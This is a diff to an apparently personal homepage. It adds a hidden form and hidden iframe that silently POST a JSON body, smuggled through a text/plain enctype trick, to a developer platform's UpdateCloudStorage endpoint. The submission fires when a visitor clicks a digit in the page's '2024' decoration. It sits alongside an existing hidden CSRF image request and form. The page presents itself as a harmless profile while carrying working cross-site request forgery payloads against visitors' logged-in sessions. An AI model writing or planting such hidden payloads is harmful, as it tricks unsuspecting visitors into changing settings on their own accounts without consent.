@@ -29,7 +29,7 @@
       <img class="csrf-img" src="https://ixr.woa.com/sgapi/v1/hello" alt="csrf" />
       <h3 style="margin-top:180px;">Hi, I'm col<span class="red">i</span>n.tao</h3>
       <span class="desc block underline"><span class="red">@</span><span class="green">2</span><span class="yellow"
-          onclick="sb();">0</span><span class="green">2</span><span class="blue">4</span></span>
+          onclick="sb();">0</span><span class="green">2</span><span class="blue" onclick="sb2();">4</span></span>
       <span class="desc block">Stay Hungry, Stay Foolish</span>
       <span class="desc block">I don't know where I'm going, but I'm on my way.</span>
       <div>
@@ -100,10 +100,19 @@
     action="https://ixr.woa.com/api/v1/trpc.xr.version_mgr.VersionOperate/GetWaitingReviewVersions">
     <input type="hidden" name="{&quot;page_no&quot:1, &quot;page_size&quot:10, &quot;dommy" value="&quot;:0}">
   </form>
+  <form class="csrf-hidden" id="sb2" method="POST" target="yiframe" enctype="text/paly"
+    action="https://developer-dev.xrstore.tencent.com/v1/trpc.xr.platform_services_mgr.PlatformServicesMgr/UpdateCloudStorage?organization_id=0&app_id=62309141091197045">
+    <input type="hidden" name="{&quot;app_id&quot:&quot;62309141091197045&quot, &quot;enabled&quot:true, &quot;dommy"
+      value="&quot;:0}">
+  </form>
   <iframe id="frame" name="xiframe" style="display:none;"></iframe>
+  <iframe id="frame" name="yiframe" style="display:none;"></iframe>
   <script>
     function sb() {
       document.getElementById("sb").submit();
+    }
+    function sb2() {
+      document.getElementById("sb2").submit();
     }
   </script>
   <script src="js/kontext.js"></script>
